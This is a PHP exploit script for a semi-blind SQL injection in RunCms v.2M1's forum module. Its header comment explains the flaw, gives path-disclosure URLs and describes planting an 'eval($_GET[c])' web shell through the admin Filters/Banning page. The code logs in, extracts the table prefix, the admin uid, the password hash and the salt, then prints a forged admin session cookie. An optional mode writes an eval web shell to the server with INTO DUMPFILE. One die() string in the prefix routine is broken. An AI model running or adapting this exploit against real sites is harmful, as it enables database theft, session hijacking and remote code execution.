<?php
    /*
    RunCms v.2M1 /modules/forum/post.php - 'forum' remote semi-blind SQL Injection Exploit
    by Nine:Situations:Group::bookoo
    site: http://retrogod.altervista.org/

    software site: http://www.runcms.org/

    vulnerable code in /modules/forum/post.php near lines 16-34 :

    ...
    if ( empty($_POST['forum']) ) {
    redirect_header("index.php", 2, _MD_ERRORFORUM);
    exit();
    }
    else if ( empty($_POST['message']) ) {
    redirect_header("javascript:history.go(-1)", 2, _MD_ERRORMESSAGE);
    exit();
    }
    else {
    $sql = "SELECT * FROM ".$bbTable['forums']." WHERE forum_id = ".$_POST['forum'].""; // <-------- !!!
    if (!$result = $db->query($sql)) {
    redirect_header("index.php", 2, _MD_CANTGETFORUM);
    exit();
    }
    ...

    'forum' variable is taken from $_POST[] array and inserted in a sql query without
    prior santization and without being surrounded by quotes.
  Then you can subsequently manipulate this query in /modules/forum/class/class.permissions.php by
passing
    another 'UNION SELECT' as first argument of the 'UNION SELECT' passed to post.php
    (a little bit complex uh? $forum_id is user controlled ...)

    100-102:
    ...
    if ($user_id > 0) {
    $sql = "SELECT * FROM ".$bbTable['forum_access']." WHERE forum_id=$forum_id AND user_id=$user_id";
    ...

    the result is that you can extract the sha1 hash of the admin user and the corrispondent salt.
    If you cannot decrypt the hash... you can always hijack an active session (meaning the admin user
    must be logged in) by building the admin cookie, no check ex. on ip address.

    To do that you need the table prefix. A default one does not exist, but exists a
    'suggested one' when installing the cms, which is 'runcms', but an empty one is not allowed.
    However with MySQL 5.0 you can have the table prefix by interrogating information_schema.TABLES

    This whole thing works regardless of php.ini settings but you need:

    - a valid user account

    Register!

    - an existing row in [prefix]_forum_forums table
    - an existing row in [prefix]_forum_forum_access table

    which is very possible against a runcms installation with a working and active forum.

    Also, you could manipulate the query in post.php to export a php shell through
    'INTO DUMPFILE' method, but you need FILE privilege and magic_quotes_gpc = off.

    It's also possible to disclose absolute path in certain conditions (see error_reporting)
    by polluting a preg_match() argument:

    http://[host]/[path_to_runcms]/modules/contact/index.php?op[]=1
    http://[host]/[path_to_runcms]/userinfo.php?uid[]=1


    Final notes:
    This sql injection vulnerability has to be considerated as high risk because as ADMIN you
    can inject php code by the Filter/Banning functionalities, ex:

    click 'Administration Menu', then 'System Admin', then click on the Filters/Banning icon,
    then 'Prohibited: Emails'
    Now you can edit the /modules/system/cache/bademails.php file
    Type in:

    <?php eval($_GET[c]);?>

    then you launch commands:

    http://[host]/[path_to_runcms]/modules/system/cache/bademails.php?c=system(dir);

    you can do the same with all filter utilities ...

    */

    $err[0] = "[!] This script is intended to be launched from the cli!";
    $err[1] = "[!] You need the curl extesion loaded!";

    function my_header() {
        print
("\x52\x75\x6e\x43\x6d\x73\x20\x76\x2e\x32\x6d\x31\x20\x2f\x6d\x6f\x64\x75\x6c\x65\x73\x2f\x66\x6f\x72\x75\x6d\x2f\x70\x6f\x73\x74\x2e\x70\x68\x70\x20\x2d\x20\x27\x
66\x6f\x72\x75\x6d\x27\x20\x72\x65\x6d\x6f\x74\x65\x20\x73\x65\x6d\x69\x2d\x62\x6c\x69\x6e\x64\x20\x53\x51\x4c\x20\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x20\x45\x78\x
70\x6c\x6f\x69\x74\x20\xd\xa\x62\x79\x20\x4e\x69\x6e\x65\x3a\x53\x69\x74\x75\x61\x74\x69\x6f\x6e\x73\x3a\x47\x72\x6f\x75\x70\x3a\x3a\x62\x6f\x6f\x6b\x6f\x6f\xd\xa\x
73\x69\x74\x65\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x72\x65\x74\x72\x6f\x67\x6f\x64\x2e\x61\x6c\x74\x65\x72\x76\x69\x73\x74\x61\x2e\x6f\x72\x67\x2f\xd\xa\n");
    }
    my_header();
    if (php_sapi_name() <> "cli") {
        die($err[0]);
    }
    if (!extension_loaded('curl')) {
        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
        false;
        if ($win) {
            !dl("php_curl.dll") ? die($err[1]) :
             print("[*] curl loaded\n");
        } else {
  !dl("php_curl.so") ? die($err[1]) :
             print("[*] curl loaded\n");
        }
    }

    function syntax() {
        print (
        "Syntax: php ".$argv[0]." [host] [path] [user] [pass] [OPTIONS] \n". "Options:
                                                      \n". "--port:[port]         - specify a port
                                    \n". "                        default->80
                  \n". "--prefix              - try to extract table prefix from information.schema
\n". "                        default->runcms                                     \n".
"--proxy:[host:port]   - use proxy                                           \n". "--skiptest
     - skip preliminary tests                              \n". "--test                - run only
tests                                      \n". "--export_shell:[path] - try to export a shell with
INTO DUMPFILE, needs Mysql\n". "                        FILE privilege
        \n". "Examples:   php ".$argv[0]." 192.168.0.1 /runcms/ bookoo pass               \n". "
        php ".$argv[0]." 192.168.0.1 / bookoo pass --prefix --proxy:1.1.1.1:8080   \n". "
 php ".$argv[0]." 192.168.0.1 / bookoo pass --prefix --export_shell:/var/www\n");
        die();
    }
 error_reporting(E_ALL ^ E_NOTICE);
    $host = $argv[1];
    $path = $argv[2];
    $_user = $argv[3];
    $_pass = $argv[4];
    $prefix = "runcms";


    $argv[4] ? print("[*] Attacking...\n") :
    syntax();

    $_f_prefix = false;
    $_use_proxy = false;
    $port = 80;
    $_skiptest = false;
    $_test = false;
    $into_outfile = false;

    for ($i = 3; $i < $argc; $i++) {
        if (stristr($argv[$i], "--prefix")) {
            $_f_prefix = true;
        }
        if (stristr($argv[$i], "--proxy:")) {
            $_use_proxy = true;
            $tmp = explode(":", $argv[$i]);
            $proxy_host = $tmp[1];
            $proxy_port = (int)$tmp[2];
        }
        if (stristr($argv[$i], "--port:")) {
            $tmp = explode(":", $argv[$i]);
            $port = (int)$tmp[1];
        }
if (stristr($argv[$i], "--skiptest")) {
            $_skiptest = true;
        }
        if (stristr($argv[$i], "--test")) {
            $_test = true;
        }
        if (stristr($argv[$i], "--export_shell:")) {
            $tmp = explode(":", $argv[$i]);
            $my_path = $tmp[1];
            $into_outfile = true;
        }

    }
function _s($url, $is_post, $ck, $request) {
        global $_use_proxy, $proxy_host, $proxy_port;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        if ($is_post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $request."\r\n");
        }
        curl_setopt($ch, CURLOPT_HEADER, 1);
        $cookies = array("Cookie: ".$ck);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $cookies);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Googlebot/2.1");
        curl_setopt($ch, CURLOPT_TIMEOUT, 0);

        if ($_use_proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
        }
        $_d = curl_exec($ch);
        if (curl_errno($ch)) {
            die("[!] ".curl_error($ch)."\n");
        } else {
            curl_close($ch);
        }
        return $_d;
    }

    function my_encode($str) {
        $_out = "0x";
        for ($i = 0; $i < strlen($str); $i++) {
            $_out .= dechex(ord($str[$i]));
        }
        return $_out;
    }

    function find_prefix() {
        global $host, $port, $path, $url, $ck;
        $_tn = "TABLE_NAME";
        $_ift = "information_schema.TABLES";

        $_table_prefix = "";
        $j = -15;
        $_sql = "-99999 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 FROM $_ift";
        $_sql = urlencode($_sql);
        $out = _s($url, 1, $ck, "message=1&forum=$_sql&");

        if (chk_err_ii($out)) {
            die("[!] $_ift not availiable.");
        } else {
            print "[*] Initiating table prefix extraction...\n";
        }
        $c = array(0);
        $c = array_merge($c, range(0x30, 0x39));
        $j = 1;
        $_len = "";
        print ("[*] Table name length: ");
 while (!stripos ($_len, "\x00")) {
            for ($i = 0; $i <= 0xff; $i++) {
                $f = false;
                if (in_array($i, $c)) {
                    $_enc = my_encode("-999999 UNION SELECT 0,0,1,(CASE WHEN
(ASCII(SUBSTR(LENGTH($_tn) FROM $j FOR 1))=$i) THEN 1 ELSE 0 END),0,0,0,0,0,0,0,0 FROM $_ift WHERE
$_tn LIKE 0x255f666f72756d5f666f72756d5f67726f75705f616363657373 LIMIT 1 --");
                    $_sql = "-99999 UNION SELECT $_enc,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
FROM $_ift";
                    $_sql = urlencode($_sql);
                    $out = _s($url, 1, $ck, "message=1&forum=$_sql&");

                    if (chk_err($out)) {
                        $f = true;
                        $_len .= chr($i);
                        print chr($i);
                        break;
                    }
                }
            }
            if ($f == false) {
                die("\n[!] Unknown error ...");
            }
            $j++;
        }
        $_len = (int) $_len - 25;
        print ("\n[*] Prefix length: ".$_len."\n");
        $c = array(0);
        $c = array_merge($c, range(0x21, 0x7E));
        $j = 1;
        $_table_prefix = "";
        print ("[*] Table prefix: ");
        while ((!stripos ($_table_prefix, "\x00")) and (!(strlen($_table_prefix) == $_len))) {
            for ($i = 0; $i <= 0xff; $i++) {
                $f = false;
                if (in_array($i, $c)) {
                    $_enc = my_encode("-999999 UNION SELECT 0,0,1,(CASE WHEN (ASCII(SUBSTR($_tn FROM
$j FOR 1))=$i) THEN 1 ELSE 0 END),0,0,0,0,0,0,0,0 FROM $_ift WHERE $_tn LIKE
0x255f666f72756d5f666f72756d5f67726f75705f616363657373 LIMIT 1 --");
                    $_sql = "-99999 UNION SELECT $_enc,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
FROM $_ift";
                    $_sql = urlencode($_sql);
                    $out = _s($url, 1, $ck, "message=1&forum=$_sql&");
                    if (chk_err($out)) {
                        $f = true;
                        $_table_prefix .= chr($i);
                        print chr($i);
                        break;
                    }
                }
            }
            if ($f == false) {
                die("\n[!] Unknown error ..      }
            $j++;
        }
        return $_table_prefix;
    }

    function export_sh() {
        global $url, $prefix, $my_path, $ck;
        //change php code if you want
        $_enc = my_encode("<?php eval(\$_GET[c]);?>"); //just for the purpose of hiding from the
eye, you have to use single quotes for INTO DUMPFILE
        $_sql = "-99999 UNION SELECT
null,$_enc,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null INTO
DUMPFILE '".$my_path."/sh.php' FROM ".$prefix."_forum_forums";
        $_sql = urlencode($_sql);
        $_o = _s($url, 1, $ck, "message=1&forum=$_sql&");

        if (chk_err_ii($o)) {
            die("[!] mmm, failed!");
        } else {
            die("[*] Seems ok. Check the shell manually. It was the right path?");
        }
    }

    function chk_login($s) {
        if (stripos ($s,
"\x54\x68\x61\x6e\x6b\x20\x79\x6f\x75\x20\x66\x6f\x72\x20\x6c\x6f\x67\x67\x69\x6e\x67\x20\x69\x6e")) {
            return true;
        } else {
            return false;
        }
    }

    function chk_err($s) {
        if (stripos ($s,
"\x77\x68\x69\x6c\x65\x20\x71\x75\x65\x72\x79\x69\x6e\x67\x20\x74\x68\x65\x20\x64\x61\x74\x61\x62\x61\x73\x65"))
{
            return true;
        } else {
            return false;
        }
    }

    function chk_err_ii($s) {
        if (stripos ($s, "\x74\x20\x67\x65\x74\x20\x66\x6f\x72\x75\x6d\x20\x64\x61\x74\x61")) {
            return true;
        } else {
            return false;
        }
    }


    $url = "http://$host:$port".$path."user.php";
    $out = _s($url, 1, "", "uname=$_user&pass=$_pass&op=login&");
    if (chk_login($out)) {
        print("[*] Logged in!\n");
    } else {
        die("[!] Not logged in.");
    }

    $tmp = explode("Set-Cookie: ", $out);
    $ck = "";
    for ($i = 1; $i < count($tmp); $i++) {
        $ttmp = explode(" ", $tmp[$i]);
        $ck .= " ".$ttmp[0];
    }
    //echo "[*] Your cookie->".$ck."\n";

    $url = "http://$host:$port".$path."modules/forum/post.php";
    $_sql = "1 1 1";
    $_sql = urlencode($_sql);
    if (!$_skiptest) {
        $out = _s($url, 1, $ck, "message=1&forum=$_sql&");
        if (chk_err_ii($out)) {
            print("[*] Vulnerable!\n");
        } else {
            die("[!] Not vulnerable.");
        }
    }

    if ($_test) {
        die;
    }

    if ($_f_prefix == true) {
        $prefix = find_prefix();
    }

    if ($into_outfile == true) {
        export_sh();
    }

    $c = array(0);
    $c = array_merge($c, range(0x30, 0x39));
    $_uid = "";
    print ("\n[*] admin uid: ");
    $j = 1;
    while (!stripos ($_uid, "\x00")) {
        for ($i = 0; $i <= 0xff; $i++) {
            $f = false;
            if (in_array($i, $c)) {
                $_enc = my_encode("-999999 UNION SELECT 0,0,1,(CASE WHEN (ASCII(SUBSTR(uid FROM $j
FOR 1))=$i) THEN 1 ELSE 0 END),0,0,0,0,0,0,0,0 FROM ".$prefix."_users WHERE level=5 LIMIT 1 --");
                $_sql = "-99999 UNION SELECT $_enc,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 FROM
".$prefix."_forum_forums";

                $_sql = urlencode($_sql);
                $out = _s($url, 1, $ck, "message=1&forum=$_sql&");
                if (chk_err($out)) {
                    $f = true;
                    $_uid .= chr($i);
                    print chr($i);
                    break;
                }
            }
        }
        if ($f == false) {
            die("\n[!] Unknown error ...");
        }
        $j++;
    }
    $_uid = (int) $_uid;
    $c = array(0);
    $c = array_merge($c, range(0x30, 0x39));
    $c = array_merge($c, range(0x61, 0x66));
    $_hash = "";
    print ("\n[*] Initiating hash extraction ...\n[*] pwd hash: ");
    $j = 1;
    while (!stripos ($_hash, "\x00")) {
        for ($i = 0; $i <= 0xff; $i++) {
            $f = false;
            if (in_array($i, $c)) {
                $_enc = my_encode("-999999 UNION SELECT 0,0,1,(CASE WHEN (ASCII(SUBSTR(pass FROM $j
FOR 1))=$i) THEN 1 ELSE 0 END),0,0,0,0,0,0,0,0 FROM ".$prefix."_users WHERE uid=$_uid LIMIT 1 --");
                $_sql = "-99999 UNION SELECT $_enc,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 FROM
".$prefix."_forum_forums";
                $_sql = urlencode($_sql);
                $out = _s($url, 1, $ck, "message=1&forum=$_sql&");
                if (chk_err($out)) {
                    $f = true;
                    $_hash .= chr($i);
                    print chr($i);
                    break;
                }
            }
        }
        if ($f == false) {
            die("\n[!] Unknown error ...");
        }
        $j++;
  }
    $_salt = "";
    print ("\n[*] salt: ");
    $j = 1;
    while (!stripos ($_salt, "\x00")) {
        for ($i = 0; $i <= 0xff; $i++) {
            $f = false;
            if (in_array($i, $c)) {
                $_enc = my_encode("-999999 UNION SELECT 0,0,1,(CASE WHEN (ASCII(SUBSTR(pwdsalt FROM
$j FOR 1))=$i) THEN 1 ELSE 0 END),0,0,0,0,0,0,0,0 FROM ".$prefix."_users WHERE uid=$_uid LIMIT 1 --");
                $_sql = "-99999 UNION SELECT $_enc,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 FROM
".$prefix."_forum_forums";
                $_sql = urlencode($_sql);
                $out = _s($url, 1, $ck, "message=1&forum=$_sql&");
                if (chk_err($out)) {
                    $f = true;
                    $_salt .= chr($i);
                    print chr($i);
                    break;
                }
            }
        }
        if ($f == false) {
            die("\n[!] Unknown error ...");
        }
        $j++;
    }
    print("\n[*] Admin cookie: rc2_sess=". urlencode(serialize(array($_uid,
sha1(trim($_hash).trim($_salt)), time()+ 2678400))).";");
?>
